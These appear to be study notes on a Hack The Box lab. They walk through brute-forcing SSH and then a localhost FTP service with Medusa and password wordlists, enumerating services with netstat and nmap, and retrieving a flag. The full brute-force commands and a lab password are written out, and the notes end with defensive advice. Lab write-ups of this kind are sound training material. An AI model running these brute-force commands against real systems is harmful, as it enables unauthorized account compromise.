![Image](https://images.openai.com/static-rsc-4/im9ty36dT842Nwc8iCGPNg2k1OUZxYBmCoH3pWDe8go9lbE2YlZPZKggbf-agOi31aR6rYnRBW_9EBfEtxlL6YHstY4VzfejDmaSTLSR7DQ0FncHJbh5vwzaZRsWgm3L6-sByukla-w1vbt6xCVttHkLI-7QYvt3VF7nZ5prZ2zdEmvB7pWjnOu6JDV9JWP8?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/VUjG3MT2rkyekckORDPqt2f_a6N5sO77_0NLbgNPzM9N5YbB88q2Dnb3QRjv74rWmqEaIqZML93lmLipX9d4o11P5fAAk0Dxp5-yxX2-fUwRORJ8w4jJuMdTQsGijpgtDsI6s61mrMgvjTuLXeRCv50tpTjkvxQctsJRlbw2bMpXKeGM6JDW8QQu3iJETYHr?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/z0Z8jUs0xCcYgTvW5ub7fXWEM5TwHPtfAQn9hsHrzaQXXOv0KKwwM6tIjUzpVjrYq87sWn3vBH38Wnd1lvVeHTGC_Y6A3MWuPeKvYElY2Al_pyRQaf06_yPMZ1jYZIVHcKWIHbNvfAbAqEqHIdzfLwVxT6r_YVjur2gJN9ATsM3aBpu3snokwJrGfy91kYcZ?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/SwAR3KaspHKi5BCNVUMhzMVNISv-g-dVHTSTXfhzaDKGYFlr-bK3cGXQz7GnNHFQO2aoW3Z1PlI3k411eD1NeM-Nenpsq9PezLGxzh12B6tn2zz4s75RGXVZZtDa7FQYPQDJB5SPiox9icYIwuDx8PHe2oN-h1P1FCNvqvc9tcQLntU-2FR93da7gcdL2QP3?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/nvGZtC4rLiPhzOKHTRHDsKY4Hn1Q4Kk4mNC7Mv71wC2xv0IWPQ-fmuVko7q5yUEPvH0qTx_07wSmQA7QZICs2DvDUcmFsJtCd2MkMqDTjHjgna8b1YsU7350PK3ie5ebskbyB9D3wQibj2LDQ81-zGoJuj5k77sPBQyXE1YOvL9I4c7ozi6uQieXKpFURQ8c?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/4k92fvhkCfhk9m5lzXtQ_GTMzdIwU2tkJP555tWXVgLJWIC1KwNhnM6S4-D1JOQZYWYlwXmkXx7qYKwxcDVxltzaTtS86DfHlYEi96kwWjyDvVdIfugddz7u4VWkotIcXSfTp08uRXODXZLArPu4anJpx6033ZEy_PnTtNJ0cx0IwPIBenOCkghjKnht2C-7?purpose=fullsize)

This section puts the previous **Medusa** concepts into a practical HTB workflow. The two main services are **SSH** and **FTP**, and the lab demonstrates how weak credentials can expose access to additional services.

---

# 1. Big Picture

The overall attack chain in this lab is:

```text
                    TARGET SYSTEM
                         │
                         ↓
                 SSH authentication
                         │
                    Medusa + wordlist
                         │
                         ↓
                  Valid SSH password
                         │
                         ↓
                    SSH access
                         │
                         ↓
                Enumerate local services
                         │
                         ↓
                    Discover FTP
                         │
                         ↓
                 Identify ftpuser
                         │
                         ↓
                 Medusa + FTP module
                         │
                         ↓
                 Valid FTP password
                         │
                         ↓
                  FTP authentication
                         │
                         ↓
                     flag.txt
```

### ⭐ Main lesson

> **Compromising one service can reveal additional attack surfaces on the same system.**

---

# 2. SSH — Secure Shell

**SSH (Secure Shell)** is a cryptographic network protocol that provides a secure channel for:

- Remote login
    
- Command execution
    
- File transfers
    

It is designed to operate securely over an otherwise unsecured network.

### SSH's major advantage

SSH encrypts communication.

Therefore, it is significantly safer than protocols such as Telnet, which do not provide the same protection.

However:

> **Encryption does not make weak passwords strong.**

If SSH authentication allows weak passwords, attackers can still attempt password guessing against the service.

---

# 3. FTP — File Transfer Protocol

**FTP (File Transfer Protocol)** is used to transfer files between systems.

Common uses include:

- Uploading files
    
- Downloading files
    
- Website file management
    
- Transferring files between client and server
    

### ⚠️ Important weakness

Standard FTP transmits information, including authentication credentials, in **cleartext**.

Therefore, FTP can be vulnerable to:

- Credential interception
    
- Brute-force/password attacks
    
- Other network-based attacks
    

---

# 4. SSH vs FTP

|Feature|SSH|FTP|
|---|---|---|
|Full name|Secure Shell|File Transfer Protocol|
|Primary purpose|Remote access/commands|File transfer|
|Encryption|Yes|Standard FTP: No|
|Typical port|22|21|
|Authentication|Username/password or keys|Username/password|
|Brute-force risk|Yes, if weak credentials|Yes, if weak credentials|
|Security|Stronger when properly configured|Less secure by default|

---

# 5. Kick-Off — Targeting SSH

The lab assumes that the username is already known:

```text
sshuser
```

The goal is therefore to determine whether a password from the provided wordlist works.

The source command is:

```bash
medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

---

# 6. Breaking Down the SSH Command ⭐

```text
medusa
```

Starts Medusa.

### `-h <IP>`

Specifies the target host.

```text
-h <IP>
```

### `-n <PORT>`

Specifies the port.

SSH normally uses:

```text
22
```

but the lab allows a custom `<PORT>`.

### `-u sshuser`

Specifies the known username:

```text
sshuser
```

### `-P`

Provides the password wordlist:

```text
2023-200_most_used_passwords.txt
```

### `-M ssh`

Selects Medusa's SSH module.

### `-t 3`

Runs three parallel login attempts.

---

# 7. Command as a Diagram

```text
medusa
  │
  ├── Target → <IP>
  │
  ├── Port → <PORT>
  │
  ├── Username → sshuser
  │
  ├── Passwords → 2023-200_most_used_passwords.txt
  │
  ├── Module → SSH
  │
  └── Parallel tasks → 3
```

---

# 8. Why `-t 3`?

The lab uses:

```bash
-t 3
```

This means Medusa can perform **three authentication attempts concurrently**.

Increasing the number can increase speed, but the source correctly points out that higher concurrency can also:

- Increase detection likelihood
    
- Trigger security controls
    
- Increase load on the target
    

So:

```text
More tasks
    ↓
Potentially faster
    +
Potentially noisier
```

---

# 9. Successful SSH Result

The lab shows output similar to:

```text
ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t [SUCCESS]
```

The important pieces are:

```text
Service → SSH
Host → Target IP
User → sshuser
Password → discovered password
Status → SUCCESS
```

This tells the tester that the supplied credentials were accepted by the SSH service.

---

# 10. Gaining SSH Access

After obtaining valid credentials, the lab uses:

```bash
ssh sshuser@<IP> -p PORT
```

Breaking this down:

```text
ssh
 ↓
SSH client

sshuser
 ↓
Username

<IP>
 ↓
Target

-p PORT
 ↓
SSH service port
```

The result is an interactive shell on the target system.

---

# 11. ⭐ Important Transition

This is where the lab becomes particularly useful.

You are no longer just:

```text
Outside → Login attempt
```

You now have:

```text
Outside
   ↓
SSH authentication
   ↓
Valid credentials
   ↓
SSH session
   ↓
Inside the system
```

This gives you the ability to perform further **authorized enumeration**.

---

# 12. Expanding the Attack Surface

Once inside, the lab checks for listening services.

The command is:

```bash
netstat -tulpn | grep LISTEN
```

The result includes:

```text
tcp   0   0 0.0.0.0:22   0.0.0.0:*   LISTEN
tcp6  0   0 :::22        :::*         LISTEN
tcp6  0   0 :::21        :::*         LISTEN
```

The important discovery is:

```text
21/tcp
```

---

# 13. Understanding the `netstat` Command

```bash
netstat -tulpn | grep LISTEN
```

The command filters for listening network services.

The important concept is:

```text
Listening port
      ↓
Potential network service
      ↓
Potential attack surface
```

The lab discovers:

```text
22 → SSH
21 → FTP
```

---

# 14. Confirming FTP with Nmap

The lab then performs local reconnaissance:

```bash
nmap localhost
```

The relevant result is:

```text
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```

This confirms:

```text
21/tcp → FTP
22/tcp → SSH
```

---

# 15. Why Use Both `netstat` and `nmap`?

They provide different pieces of information.

### `netstat`

Shows listening services/sockets from the system's perspective.

### `nmap`

Helps identify exposed ports and the services associated with them.

The lab therefore uses:

```text
netstat
   ↓
Discover listening port
   ↓
nmap
   ↓
Confirm service
```

---

# 16. Attack Surface Expansion

This is a **very important pentesting concept**.

Initially you know:

```text
SSH
```

After enumeration:

```text
SSH
FTP
```

Therefore:

```text
Initial attack surface
        ↓
     SSH only
        ↓
Enumeration
        ↓
   SSH + FTP
```

### ⭐ Remember

> **Enumeration can reveal services that weren't obvious from the initial access point.**

---

# 17. Targeting the FTP Server

The lab discovers an `/home` directory containing:

```text
ftpuser
```

This suggests that:

```text
ftpuser
```

may be associated with the FTP service.

The source then uses Medusa against the local FTP service.

```bash
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

---

# 18. Breaking Down the FTP Command

### Target

```text
-h 127.0.0.1
```

The FTP server is running locally.

### Username

```text
-u ftpuser
```

### Password list

```text
-P 2020-200_most_used_passwords.txt
```

### Module

```text
-M ftp
```

### Parallel tasks

```text
-t 5
```

So:

```text
                 MEDUSA
                    │
        ┌───────────┼───────────┐
        ↓           ↓           ↓
   127.0.0.1     ftpuser    password list
        │           │           │
        └───────────┼───────────┘
                    ↓
                 FTP module
                    ↓
                FTP service
```

---

# 19. Why `127.0.0.1`?

The source specifically notes that the FTP server is running locally.

Therefore:

```text
127.0.0.1
```

refers to the same machine on which the SSH session is running.

This means the connection is:

```text
Current target
      ↓
localhost
      ↓
FTP service
```

---

# 20. Why Increase `-t` to 5?

The FTP example uses:

```bash
-t 5
```

instead of:

```bash
-t 3
```

from the SSH example.

So Medusa can perform five parallel authentication attempts.

Again:

```text
Higher concurrency
       ↓
Potentially faster
       +
Potentially more detectable/load
```

The exact value should be appropriate for the authorized lab/engagement.

---

# 21. Successful FTP Authentication

Medusa reports something similar to:

```text
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ... Password: ... [SUCCESS]
```

The key information is:

```text
Service → FTP
Host → 127.0.0.1
User → ftpuser
Password → discovered password
Status → SUCCESS
```

Now the tester can authenticate to FTP.

---

# 22. Connecting to FTP

The lab uses:

```bash
ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
```

This initiates an FTP connection to the local FTP service.

The server responds with information such as:

```text
220 (vsFTPd 3.0.5)
```

Then:

```text
331 Please specify the password.
```

After successful authentication:

```text
230 Login successful.
```

### ⭐ Important FTP response

```text
230 Login successful.
```

means the FTP authentication succeeded.

---

# 23. Exploring the FTP Session

After logging in:

```text
ftp>
```

The lab runs:

```text
ls
```

This lists files available through the FTP session.

The result includes:

```text
flag.txt
```

---

# 24. Downloading `flag.txt`

The FTP command:

```text
get flag.txt
```

means:

> Download the remote `flag.txt` file to the local machine.

The transfer completes, after which the FTP session is exited:

```text
exit
```

---

# 25. Reading the Flag

Back in the shell:

```bash
cat flag.txt
```

The lab then displays:

```text
HTB{...}
```

That's the final objective of the lab.

---

# 26. ⭐ Complete Attack Chain

This entire section can be memorized as:

```text
                    START
                      │
                      ↓
              Known SSH username
                  "sshuser"
                      │
                      ↓
             Medusa SSH module
                      │
                      ↓
             Password wordlist
                      │
                      ↓
               Valid SSH password
                      │
                      ↓
                  SSH login
                      │
                      ↓
              Enumerate services
                      │
                      ↓
             netstat → port 21
                      │
                      ↓
              nmap → FTP confirmed
                      │
                      ↓
             Identify "ftpuser"
                      │
                      ↓
              Medusa FTP module
                      │
                      ↓
             Valid FTP password
                      │
                      ↓
                 FTP login
                      │
                      ↓
                   ls
                      │
                      ↓
                 flag.txt
                      │
                      ↓
                 get flag.txt
                      │
                      ↓
                  cat flag.txt
                      │
                      ↓
                    FLAG
```

---

# 27. 🔥 Most Important Commands

### Check listening services

```bash
netstat -tulpn | grep LISTEN
```

### Scan localhost

```bash
nmap localhost
```

### Medusa against SSH

```bash
medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

### Connect through SSH

```bash
ssh sshuser@<IP> -p PORT
```

### Medusa against local FTP

```bash
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

### Connect to FTP

```bash
ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
```

### List FTP files

```text
ls
```

### Download a file

```text
get flag.txt
```

### Exit FTP

```text
exit
```

### Read downloaded file

```bash
cat flag.txt
```

---

# 28. 🧠 Important HTB Concepts

## 1. Credential discovery

A weak password can provide initial access.

## 2. Initial access ≠ complete compromise

Getting SSH access is only the beginning of the lab.

## 3. Enumeration

Once inside, look for additional services.

```text
Access
 ↓
Enumeration
 ↓
New service
 ↓
New attack surface
```

## 4. Service-specific modules

Medusa needs the appropriate module:

```text
SSH → -M ssh
FTP → -M ftp
```

## 5. Local services matter

A service bound to localhost may not be directly accessible externally, but once you have an internal shell, it can become reachable.

---

# 29. SSH vs FTP in This Lab

|Stage|SSH|FTP|
|---|---|---|
|Purpose|Remote shell|File transfer|
|Port|22 normally|21|
|Medusa module|`ssh`|`ftp`|
|Username|`sshuser`|`ftpuser`|
|Access obtained|Interactive shell|FTP session|
|Next action|Enumerate services|Find/download flag|
|Key command|`ssh`|`ftp`|

---

# 30. 🛡️ Defensive Lessons

This lab demonstrates several weaknesses defenders should prevent.

### Strong passwords

A common-password wordlist should not easily produce valid credentials.

### SSH hardening

Use strong authentication and preferably key-based authentication where appropriate.

### Rate limiting

Slow repeated authentication attempts.

### Monitoring

Detect unusual numbers of failed logins.

### Secure FTP alternatives

Standard FTP transmits credentials in cleartext. Secure alternatives such as SFTP or appropriately secured FTP variants should be considered depending on the environment.

### Minimize exposed services

Only necessary services should be running and reachable.

### Principle of least privilege

Even if an account is compromised, it should have only the permissions it actually needs.

---

# 🎯 Final Revision Notes

### SSH

> **SSH provides encrypted remote access, but weak passwords can still make password-based authentication vulnerable to brute-force attacks.**

### FTP

> **FTP is a file-transfer protocol, and standard FTP sends authentication information in cleartext.**

### Medusa

> **Medusa automates authentication testing through service-specific modules and parallel tasks.**

### Enumeration

> **After gaining SSH access, enumerate the system to discover additional services such as FTP.**

### The key workflow

```text
Medusa SSH
    ↓
SSH access
    ↓
netstat / nmap
    ↓
FTP discovery
    ↓
Medusa FTP
    ↓
FTP access
    ↓
get flag.txt
    ↓
cat flag.txt
```

**The biggest lesson from this section:** don't stop after obtaining the first set of credentials. In an authorized penetration test, **enumeration after initial access can reveal additional services and completely change the attack path.**